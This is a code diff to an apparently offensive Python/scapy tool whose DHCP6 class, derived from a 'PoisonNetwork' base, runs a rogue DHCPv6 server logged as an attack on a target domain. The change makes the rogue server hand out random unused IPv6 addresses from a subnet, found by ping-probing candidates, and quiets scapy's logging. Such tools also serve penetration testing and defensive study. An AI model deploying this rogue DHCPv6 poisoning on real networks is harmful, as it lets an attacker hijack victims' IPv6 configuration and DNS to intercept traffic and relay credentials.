@@ -1,10 +1,13 @@
 #!/usr/bin/env python3
 from typing import Tuple
+import random
+import logging
 from scapy.all import (
     Ether,
     IP,
     UDP,
     sendp,
+    sr1,
     sniff,
     packet,
     IPv6,
@@ -20,10 +23,12 @@ from scapy.all import (
     DHCP6OptClientId,
     DHCP6_Renew,
     DUID_LL,
+    ICMPv6EchoRequest,
 )
 from loguru import logger
 from colorama import Fore, Style
 from .poisonnetwork import PoisonNetwork
+import ipaddress
 
 
 class DHCP6(PoisonNetwork):
@@ -35,6 +40,7 @@ class DHCP6(PoisonNetwork):
         iface (str): [ interface of the current subnet used ]
         info_logger (logger): [ Logger for the output ]
         domain (str): [Target domain]
+        ipv6_mask(str): [ subnet mask for ipv6 ]
         level (logger): [ Logger level to display information ]
     """
 
@@ -46,13 +52,39 @@ class DHCP6(PoisonNetwork):
         iface: str,
         info_logger: logger,
         domain: str,
+        ipv6_mask: str,
         level: str = "INFO",
     ):
         super().__init__(ip, ipv6, mac_address, iface, info_logger, level)
         self.__domain = domain + "."
+        self.__used_ipv6 = []
+        self.__ipv6_mask = ipv6_mask
+
+    def __check_if_ipv6_exists(self, ipv6: str) -> bool:
+        reply = sr1(
+            IPv6(dst=ipv6) / ICMPv6EchoRequest(),
+            timeout=1,
+            verbose=False,
+        )
+        return reply is not None
+
+    def __random_ipv6_addr(self, network: str) -> str:
+        net = ipaddress.IPv6Network(network)
+        addr_no = random.randint(0, net.num_addresses)
+        network_int = int.from_bytes(net.network_address.packed, byteorder="big")
+        addr_int = network_int + addr_no
+        addr = ipaddress.IPv6Address(addr_int.to_bytes(16, byteorder="big"))
+        return str(addr)
+
+    def __generate_ipv6(self) -> str:
+        new_ipv6 = self.__random_ipv6_addr(self.__ipv6_mask)
+        while self.__check_if_ipv6_exists(new_ipv6):
+            new_ipv6 = self.__random_ipv6_addr(self.__ipv6_mask)
+        self.__used_ipv6.append(new_ipv6)
+        return new_ipv6
 
     def __generate_ipv6_address(self, pkt: packet) -> DHCP6OptIAAddress:
-        return DHCP6OptIAAddress(addr="fe80::192.168.253.139", preflft=300, validlft=300)
+        return DHCP6OptIAAddress(addr=self.__generate_ipv6(), preflft=300, validlft=300)
 
     def __server_duid(self) -> DUID_LL:
         return DUID_LL(lladdr=self.mac_address)
@@ -188,6 +220,7 @@ class DHCP6(PoisonNetwork):
         self.info_logger.log(
             self.logger_level, f"Starting dhcp6 rogue to attack {self.__domain}"
         )
+        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
         # self._start_cleaner()
         sniff(
             filter="udp and port 547",
